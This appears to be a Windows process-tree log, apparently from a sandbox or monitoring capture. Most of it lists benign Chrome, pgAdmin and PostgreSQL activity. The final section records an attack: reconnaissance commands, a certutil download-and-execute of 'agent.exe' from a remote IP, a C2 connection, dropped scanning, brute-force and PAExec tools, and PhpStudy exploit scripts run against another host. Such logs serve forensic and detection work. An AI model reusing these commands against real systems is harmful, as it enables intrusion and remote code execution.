@@ -1,0 +1,337 @@
+chrome.exe (PID 3820): ""C:\Program Files\Google\Chrome\Application\chrome.exe" "  [x9]
+  └─ chrome.exe (PID 7100): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=crashpad-handler "--user-data-dir=C:\Users\Administrator\AppData\Local\Google\Chrome\User Data" /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler "--database=C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Crashpad" "--metrics-dir=C:\Users\Administrator\AppData\Local\Google\Chrome\User Data" --url=https://clients2.google.com/cr/report --annotation=channel= --annotation=plat=Win64 --annotation=prod=Chrome --annotation=ver="  [x9]
+  └─ chrome.exe (PID 6728): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=gpu-process --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=1252 --field-trial-handle=1228,i,15620778174164690009,1080067515344668206,131072 /prefetch:2"  [x9]
+  └─ chrome.exe (PID 3436): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-GB --service-sandbox-type=none --mojo-platform-channel-handle=1492 --field-trial-handle=1228,i,15620778174164690009,1080067515344668206,131072 /prefetch:8"  [x9]
+        connected to → 202.89.233.101:443
+        connected to → 120.253.255.162:443
+        connected to → 72.246.150.129:443
+        connected to → 61.179.108.42:443
+        connected to → 13.75.113.36:443
+        connected to → 120.253.250.226:443
+        connected to → 168.138.196.48:80
+        connected to → 124.165.213.233:443
+        connected to → 111.206.209.249:443
+        connected to → 120.253.253.34:443
+        connected to → 61.179.108.45:443
+        connected to → 202.89.233.100:443
+        connected to → 72.246.150.104:443
+        connected to → 61.179.108.43:443
+        connected to → 40.126.16.165:443
+        connected to → 40.126.16.166:443
+        connected to → 61.179.108.40:443
+        connected to → 23.99.98.7:443
+        connected to → 47.75.19.18:443
+        connected to → 111.206.76.48:443
+        connected to → 110.242.68.4:443
+        connected to → 43.243.235.138:443
+        connected to → 42.7.33.250:443
+        connected to → 47.110.23.61:443
+        connected to → 106.11.43.154:443
+        connected to → 59.82.34.236:443
+        connected to → 101.72.203.35:443
+        connected to → 112.80.255.53:443
+        connected to → 110.242.68.129:443
+        connected to → 121.40.43.188:443
+        connected to → 121.22.232.162:443
+        connected to → 111.202.85.126:443
+        connected to → 120.253.253.105:443
+        connected to → 120.253.253.38:443
+        connected to → 120.55.196.147:443
+        connected to → 115.56.90.88:443
+        connected to → 106.11.84.7:443
+        connected to → 120.253.253.225:443
+        connected to → 121.199.200.119:443
+        connected to → 118.178.109.187:443
+        connected to → 157.255.135.10:443
+        connected to → 120.253.255.166:443
+        connected to → 120.253.253.36:443
+        connected to → 120.253.253.102:443
+        connected to → 120.253.255.164:443
+        connected to → 110.242.69.43:443
+        connected to → 123.129.234.38:443
+        connected to → 116.114.96.35:443
+        connected to → 111.206.76.35:443
+        connected to → 220.194.65.35:443
+        connected to → 120.253.255.102:443
+        connected to → 123.125.132.33:443
+        connected to → 110.242.68.3:443
+        connected to → 218.68.136.35:443
+        connected to → 157.255.77.181:443
+        connected to → 110.242.69.44:443
+        connected to → 110.242.69.202:443
+        connected to → 119.167.143.64:443
+        connected to → 119.167.143.63:443
+        connected to → 111.206.208.245:443
+        connected to → 111.206.208.243:443
+        connected to → 111.206.208.240:443
+        connected to → 111.206.210.2:443
+        connected to → 110.242.68.84:443
+        connected to → 110.242.68.247:443
+        connected to → 47.95.53.4:443
+        connected to → 180.101.49.93:443
+        connected to → 112.80.255.214:443
+        connected to → 123.125.132.31:443
+        connected to → 117.34.84.3:443
+        connected to → 120.253.255.161:443
+        connected to → 120.253.253.226:443
+        connected to → 23.67.73.10:443
+        connected to → 211.91.76.55:443
+        connected to → 23.42.180.68:443
+  └─ chrome.exe (PID 1196): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-GB --service-sandbox-type=utility --mojo-platform-channel-handle=1580 --field-trial-handle=1228,i,15620778174164690009,1080067515344668206,131072 /prefetch:8"  [x9]
+  └─ chrome.exe (PID 4776): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=6 --launch-time-ticks=1217843364318 --mojo-platform-channel-handle=2264 --field-trial-handle=1228,i,15620778174164690009,1080067515344668206,131072 /prefetch:1"  [x8]
+  └─ chrome.exe (PID 6624): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --instant-process --display-capture-permissions-policy-allowed --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --launch-time-ticks=1217843381500 --mojo-platform-channel-handle=2352 --field-trial-handle=1228,i,15620778174164690009,1080067515344668206,131072 /prefetch:1"  [x8]
+  └─ chrome.exe (PID 4560): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=7 --launch-time-ticks=1217843676686 --mojo-platform-channel-handle=3628 --field-trial-handle=1228,i,15620778174164690009,1080067515344668206,131072 /prefetch:1"  [x8]
+  └─ chrome.exe (PID 856): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=utility --utility-sub-type=audio.mojom.AudioService --lang=en-GB --service-sandbox-type=audio --mojo-platform-channel-handle=2560 --field-trial-handle=1228,i,15620778174164690009,1080067515344668206,131072 /prefetch:8"  [x9]
+  └─ chrome.exe (PID 7100): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=9 --launch-time-ticks=1217965753249 --mojo-platform-channel-handle=4316 --field-trial-handle=1184,i,15979699124547685593,75889689086335812,131072 /prefetch:1"  [x4]
+  └─ chrome.exe (PID 4812): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=10 --launch-time-ticks=1217971922428 --mojo-platform-channel-handle=2416 --field-trial-handle=1184,i,15979699124547685593,75889689086335812,131072 /prefetch:1"  [x4]
+  └─ chrome.exe (PID 5328): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=11 --launch-time-ticks=1217987976715 --mojo-platform-channel-handle=4660 --field-trial-handle=1184,i,15979699124547685593,75889689086335812,131072 /prefetch:1"  [x3]
+  └─ chrome.exe (PID 3228): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=12 --launch-time-ticks=1218160564597 --mojo-platform-channel-handle=2284 --field-trial-handle=1204,i,15738228045186771879,839107963287655055,131072 /prefetch:1"
+  └─ chrome.exe (PID 6680): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-GB --service-sandbox-type=utility --mojo-platform-channel-handle=4480 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:8"  [x11]
+        wrote → C:\Users\ADMINI~1\AppData\Local\Temp\2\5376_1853232701\software_reporter_tool.exe
+  └─ chrome.exe (PID 6792): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=14 --launch-time-ticks=1218784235134 --mojo-platform-channel-handle=4720 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1"
+  └─ chrome.exe (PID 6476): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=15 --launch-time-ticks=1218786125116 --mojo-platform-channel-handle=4504 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1"
+  └─ software_reporter_tool.exe (PID 6000): ""C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\SwReporter\99.279.200\software_reporter_tool.exe" --engine=2 --scan-locations=1,2,3,4,5,6,7,8,10 --disabled-locations=9,11 --session-id=YzNf24YYZfuvRHVbjuMFf3GpplnJ+CDak8V6SAZz --registry-suffix=ESET --enable-crash-reporting --srt-field-trial-group-name=NewCleanerUIExperiment"
+    └─ software_reporter_tool.exe (PID 3344): ""c:\users\administrator\appdata\local\google\chrome\user data\swreporter\99.279.200\software_reporter_tool.exe" --crash-handler "--database=c:\users\administrator\appdata\local\Google\Software Reporter Tool" --url=https://clients2.google.com/cr/report --annotation=plat=Win32 --annotation=prod=ChromeFoil --annotation=ver=99.279.200 --initial-client-data=0x1c0,0x1c4,0x1c8,0x19c,0x1cc,0x7ff763b525a0,0x7ff763b525b0,0x7ff763b525c0"
+    └─ software_reporter_tool.exe (PID 5176): ""c:\users\administrator\appdata\local\google\chrome\user data\swreporter\99.279.200\software_reporter_tool.exe" --enable-crash-reporting --use-crash-handler-with-id="\\.\pipe\crashpad_6000_XJTPKPDSUGJHATOO" --sandboxed-process-id=2 --init-done-notifier=600 --sandbox-mojo-pipe-token=10875049845061253074 --mojo-platform-channel-handle=568 --engine=2"
+          wrote → C:\users\administrator\appdata\local\google\chrome\user data\swreporter\99.279.200\em005_64.dll
+          wrote → C:\users\administrator\appdata\local\google\chrome\user data\swreporter\99.279.200\em004_64.dll
+          wrote → C:\users\administrator\appdata\local\google\chrome\user data\swreporter\99.279.200\em003_64.dll
+          wrote → C:\users\administrator\appdata\local\google\chrome\user data\swreporter\99.279.200\em002_64.dll
+          wrote → C:\users\administrator\appdata\local\google\chrome\user data\swreporter\99.279.200\em000_64.dll
+          wrote → C:\users\administrator\appdata\local\google\chrome\user data\swreporter\99.279.200\em001_64.dll
+          wrote → C:\users\administrator\appdata\local\google\chrome\user data\swreporter\99.279.200\edls_64.dll
+    └─ software_reporter_tool.exe (PID 3760): ""c:\users\administrator\appdata\local\google\chrome\user data\swreporter\99.279.200\software_reporter_tool.exe" --enable-crash-reporting --use-crash-handler-with-id="\\.\pipe\crashpad_6000_XJTPKPDSUGJHATOO" --sandboxed-process-id=3 --init-done-notifier=812 --sandbox-mojo-pipe-token=2896627467350078373 --mojo-platform-channel-handle=804"
+  └─ chrome.exe (PID 2904): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=17 --launch-time-ticks=1218794509389 --mojo-platform-channel-handle=1892 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1"
+  └─ chrome.exe (PID 5100): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=18 --launch-time-ticks=1218795238140 --mojo-platform-channel-handle=4628 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1"
+  └─ chrome.exe (PID 6628): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=19 --launch-time-ticks=1218807711669 --mojo-platform-channel-handle=792 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1"
+  └─ chrome.exe (PID 7156): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=21 --launch-time-ticks=1218813981963 --mojo-platform-channel-handle=4732 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1"
+  └─ chrome.exe (PID 2424): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=22 --launch-time-ticks=1218815808485 --mojo-platform-channel-handle=1120 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1"
+  └─ chrome.exe (PID 6436): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=23 --launch-time-ticks=1218816887595 --mojo-platform-channel-handle=4424 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1"
+  └─ chrome.exe (PID 6052): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=utility --utility-sub-type=chrome.mojom.UtilWin --lang=en-GB --service-sandbox-type=none --mojo-platform-channel-handle=3756 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:8"
+  └─ chrome.exe (PID 2472): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=25 --launch-time-ticks=1218823204404 --mojo-platform-channel-handle=3660 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1"
+  └─ chrome.exe (PID 3148): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=26 --launch-time-ticks=1218827287607 --mojo-platform-channel-handle=4656 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1"
+  └─ chrome.exe (PID 6344): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=gpu-process --disable-gpu-sandbox --use-gl=disabled --gpu-vendor-id=5140 --gpu-device-id=140 --gpu-sub-system-id=0 --gpu-revision=0 --gpu-driver-version=6.3.9600.19176 --gpu-preferences=UAAAAAAAAADoAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAgAgAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=5220 --field-trial-handle=1"
+  └─ chrome.exe (PID 6712): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=utility --utility-sub-type=chrome.mojom.FileUtilService --lang=en-GB --service-sandbox-type=utility --mojo-platform-channel-handle=1192 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:8"  [x2]
+  └─ chrome.exe (PID 2568): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=utility --utility-sub-type=quarantine.mojom.Quarantine --lang=en-GB --service-sandbox-type=none --mojo-platform-channel-handle=5356 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:8"  [x2]
+  └─ chrome.exe (PID 5488): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --instant-process --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=38 --launch-time-ticks=1219013486760 --mojo-platform-channel-handle=4276 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1"
+  └─ chrome.exe (PID 1872): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=39 --launch-time-ticks=1219013634048 --mojo-platform-channel-handle=2120 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1"
+  └─ chrome.exe (PID 5176): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=40 --launch-time-ticks=1219016162076 --mojo-platform-channel-handle=5188 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1"
+  └─ chrome.exe (PID 6964): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=41 --launch-time-ticks=1219019325038 --mojo-platform-channel-handle=4700 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1"
+  └─ chrome.exe (PID 3532): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=43 --launch-time-ticks=1219069089268 --mojo-platform-channel-handle=5576 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1"
+  └─ chrome.exe (PID 1244): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=44 --launch-time-ticks=1219072214486 --mojo-platform-channel-handle=4896 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1"
+  └─ chrome.exe (PID 7132): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --origin-trial-disabled-features=ConditionalFocus --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=6 --launch-time-ticks=1221646475719 --mojo-platform-channel-handle=2172 --field-trial-handle=1316,i,267746935587647917,1407363802966121102,131072 /prefetch:1"
+  └─ chrome.exe (PID 2580): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --instant-process --display-capture-permissions-policy-allowed --origin-trial-disabled-features=ConditionalFocus --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --launch-time-ticks=1221646477566 --mojo-platform-channel-handle=2184 --field-trial-handle=1316,i,267746935587647917,1407363802966121102,131072 /prefetch:1"
+  └─ chrome.exe (PID 6268): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --origin-trial-disabled-features=ConditionalFocus --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=7 --launch-time-ticks=1221646822510 --mojo-platform-channel-handle=3600 --field-trial-handle=1316,i,267746935587647917,1407363802966121102,131072 /prefetch:1"
+RuntimeBroker.exe (PID 5640): "C:\Windows\System32\RuntimeBroker.exe -Embedding"  [x6]
+notepad.exe (PID 4180): ""C:\Windows\system32\NOTEPAD.EXE" D:\benign2.txt"  [x10]
+postgres.exe (PID 2120): ""C:/Program Files/PostgreSQL/12/bin/postgres.exe" "--forkavworker" "5200""  [x2412]
+pgAdmin4.exe (PID 3148): ""C:\Program Files\PostgreSQL\12\pgAdmin 4\bin\pgAdmin4.exe" "  [x3]
+  └─ pgAdmin4.exe (PID 7036): ""C:\Program Files\PostgreSQL\12\pgAdmin 4\bin\pgAdmin4.exe" --type=crashpad-handler "--user-data-dir=C:\Users\Administrator\AppData\Local\pgadmin4\User Data" /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler "--database=C:\Users\Administrator\AppData\Local\pgadmin4\User Data\Crashpad" "--metrics-dir=C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --annotation=plat=Win64 --annotation=prod=pgadmin4 --annotation=ver= --initial-client-data=0x184,0x188,0x18c,0x160,0x190,0x7ffb80d370f8,0x7ffb8"  [x2]
+  └─ pgAdmin4.exe (PID 1144): ""C:\Program Files\PostgreSQL\12\pgAdmin 4\bin\pgAdmin4.exe" --type=gpu-process --field-trial-handle=1216,8632104137463735512,6687507368737191602,131072 --no-sandbox --user-data-dir="C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --nwapp-path="C:\Program Files\PostgreSQL\12\pgAdmin 4\bin" --start-stack-profiler --gpu-preferences=UAAAAAAAAADgAAAQAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgAAAAAAAAAeAAAAAAAAAAoAAAABAAAACAAAAAAAAAAKAAAAAAAAAAwAAAAAAAAADgAAAAAAAAAEAAAAAAAAAAA"  [x2]
+  └─ pgAdmin4.exe (PID 6508): ""C:\Program Files\PostgreSQL\12\pgAdmin 4\bin\pgAdmin4.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --field-trial-handle=1216,8632104137463735512,6687507368737191602,131072 --lang=zh-CN --service-sandbox-type=none --no-sandbox --user-data-dir="C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --nwapp-path="C:\Program Files\PostgreSQL\12\pgAdmin 4\bin" --start-stack-profiler --mojo-platform-channel-handle=1428 /prefetch:8"  [x3]
+  └─ pgAdmin4.exe (PID 6844): ""C:\Program Files\PostgreSQL\12\pgAdmin 4\bin\pgAdmin4.exe" --type=utility --utility-sub-type=storage.mojom.StorageService --field-trial-handle=1216,8632104137463735512,6687507368737191602,131072 --lang=zh-CN --service-sandbox-type=utility --no-sandbox --user-data-dir="C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --nwapp-path="C:\Program Files\PostgreSQL\12\pgAdmin 4\bin" --mojo-platform-channel-handle=1672 /prefetch:8"  [x3]
+  └─ pgAdmin4.exe (PID 2024): ""C:\Program Files\PostgreSQL\12\pgAdmin 4\bin\pgAdmin4.exe" --type=renderer --no-sandbox --file-url-path-alias="/gen=C:\Program Files\PostgreSQL\12\pgAdmin 4\bin\gen" --no-zygote --field-trial-handle=1216,8632104137463735512,6687507368737191602,131072 --lang=zh-CN --user-data-dir="C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --nwapp-path="C:\Program Files\PostgreSQL\12\pgAdmin 4\bin" --nwjs --extension-process --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --mojo-platform-"  [x2]
+    └─ python.exe (PID 3868): ""C:\Program Files\PostgreSQL\12\pgAdmin 4\python\python.exe" -s "C:\Program Files\PostgreSQL\12\pgAdmin 4\web\pgAdmin4.py""  [x3]
+      └─ conhost.exe (PID 3644): "\??\C:\Windows\system32\conhost.exe 0xffffffff"  [x33]
+      └─ cmd.exe (PID 7008): "C:\Windows\system32\cmd.exe /c "ver""  [x3]
+      └─ cmd.exe (PID 6916): "C:\Windows\system32\cmd.exe /c ""C:\Program Files\PostgreSQL\12\pgAdmin 4\runtime\pg_dump.exe" --version""  [x2]
+      └─ cmd.exe (PID 3200): "C:\Windows\system32\cmd.exe /c ""C:\Program Files\PostgreSQL\12\pgAdmin 4\runtime\pg_dumpall.exe" --version""  [x3]
+      └─ cmd.exe (PID 924): "C:\Windows\system32\cmd.exe /c ""C:\Program Files\PostgreSQL\12\pgAdmin 4\runtime\pg_restore.exe" --version""  [x3]
+      └─ cmd.exe (PID 6808): "C:\Windows\system32\cmd.exe /c ""C:\Program Files\PostgreSQL\12\pgAdmin 4\runtime\psql.exe" --version""  [x3]
+  └─ pgAdmin4.exe (PID 6948): ""C:\Program Files\PostgreSQL\12\pgAdmin 4\bin\pgAdmin4.exe" --type=utility --utility-sub-type=chrome.mojom.UtilWin --field-trial-handle=1216,8632104137463735512,6687507368737191602,131072 --lang=zh-CN --service-sandbox-type=none --no-sandbox --user-data-dir="C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --nwapp-path="C:\Program Files\PostgreSQL\12\pgAdmin 4\bin" --mojo-platform-channel-handle=2852 /prefetch:8"  [x2]
+  └─ pgAdmin4.exe (PID 6504): ""C:\Program Files\PostgreSQL\12\pgAdmin 4\bin\pgAdmin4.exe" --type=crashpad-handler "--user-data-dir=C:\Users\Administrator\AppData\Local\pgadmin4\User Data" /prefetch:7 --monitor-self --monitor-self-argument=--type=crashpad-handler "--monitor-self-argument=--user-data-dir=C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --monitor-self-argument=/prefetch:7 --monitor-self-annotation=ptype=crashpad-handler "--database=C:\Users\Administrator\AppData\Local\pgadmin4\User Data\Crashpad" "--metrics-dir=C:\"
+    └─ pgAdmin4.exe (PID 5896): ""C:\Program Files\PostgreSQL\12\pgAdmin 4\bin\pgAdmin4.exe" --type=crashpad-handler "--user-data-dir=C:\Users\Administrator\AppData\Local\pgadmin4\User Data" /prefetch:7 --no-periodic-tasks --monitor-self-annotation=ptype=crashpad-handler "--database=C:\Users\Administrator\AppData\Local\pgadmin4\User Data\Crashpad" --annotation=plat=Win64 --annotation=prod=pgadmin4 --annotation=ver= --initial-client-data=0x118,0x11c,0x120,0x9c,0x114,0x7ff71e3d80d0,0x7ff71e3d80e0,0x7ff71e3d80f0"
+  └─ pgAdmin4.exe (PID 4496): ""C:\Program Files\PostgreSQL\12\pgAdmin 4\bin\pgAdmin4.exe" --type=gpu-process --field-trial-handle=1240,1230285206016919585,15071984952487318545,131072 --no-sandbox --user-data-dir="C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --nwapp-path="C:\Program Files\PostgreSQL\12\pgAdmin 4\bin" --start-stack-profiler --gpu-preferences=UAAAAAAAAADgAAAQAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgAAAAAAAAAeAAAAAAAAAAoAAAABAAAACAAAAAAAAAAKAAAAAAAAAAwAAAAAAAAADgAAAAAAAAAEAAAAAAAAAA"
+  └─ pgAdmin4.exe (PID 4776): ""C:\Program Files\PostgreSQL\12\pgAdmin 4\bin\pgAdmin4.exe" --type=renderer --no-sandbox --file-url-path-alias="/gen=C:\Program Files\PostgreSQL\12\pgAdmin 4\bin\gen" --no-zygote --field-trial-handle=1240,1230285206016919585,15071984952487318545,131072 --lang=zh-CN --user-data-dir="C:\Users\Administrator\AppData\Local\pgadmin4\User Data" --nwapp-path="C:\Program Files\PostgreSQL\12\pgAdmin 4\bin" --nwjs --extension-process --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --mojo-platform"
+notepad.exe (PID 1524): ""C:\Windows\system32\NOTEPAD.EXE" D:\log.txt"  [x3]
+postgres.exe (PID 5920): ""C:/Program Files/PostgreSQL/12/bin/postgres.exe" "--forkbackend" "5176""  [x11]
+TSTheme.exe (PID 4624): "C:\Windows\system32\TSTheme.exe -Embedding"  [x8]
+cmd.exe (PID 4696): "cmd.exe /c "ipconfig""
+  └─ ipconfig.exe (PID 3432): "ipconfig"  [x2]
+cmd.exe (PID 2124): "cmd.exe /c "whoami&arp -a&ipconfig&ping www.baidu.com -c 1""
+  └─ whoami.exe (PID 3016): "whoami"
+  └─ ARP.EXE (PID 2708): "arp  -a"
+  └─ PING.EXE (PID 4964): "ping  www.baidu.com -c 1"
+cmd.exe (PID 1996): "cmd.exe /c "taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\Users\Public\agent.exe&cmd /c start /min C:\Users\Public\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443""
+  └─ taskkill.exe (PID 4328): "taskkill  /f /im agent.exe"
+  └─ certutil.exe (PID 3268): "certutil  -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\Users\Public\agent.exe"
+        connected to → 124.223.85.207:8079
+        wrote → C:\Users\Administrator\AppData\Local\Microsoft\Windows\INetCache\IE\69T5JAAG\sangforcat[2].exe
+        wrote → C:\Users\Public\agent.exe
+  └─ cmd.exe (PID 4360): "cmd  /c start /min C:\Users\Public\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443"
+    └─ agent.exe (PID 4128): "C:\Users\Public\agent.exe  -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443"
+          connected to → 124.223.85.207:8443
+          wrote → C:\Users\Public\PhpStudyPoc.py
+          wrote → C:\Users\Public\PhpStudyExp2.py
+          wrote → C:\Users\Public\WinBrute.exe
+          wrote → C:\Users\Public\nbtscan.exe
+          wrote → C:\Users\Public\PAExec.exe
+      └─ cmd.exe (PID 4440): "/c echo start:78cfa46d-d648-44ac-9ed8-ee7469cb82c2"
+      └─ cmd.exe (PID 3240): "/c python PhpStudyPoc.py http://121.36.30.176/"
+      └─ cmd.exe (PID 3360): "/c del /f /q PhpStudyPoc.py"
+      └─ cmd.exe (PID 3996): "/c echo end:78cfa46d-d648-44ac-9ed8-ee7469cb82c2"
+      └─ powershell.exe (PID 4808): "powershell.exe -ExecutionPolicy Bypass -C "echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc""
+      └─ powershell.exe (PID 3284): "powershell.exe -ExecutionPolicy Bypass -C "cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"'""
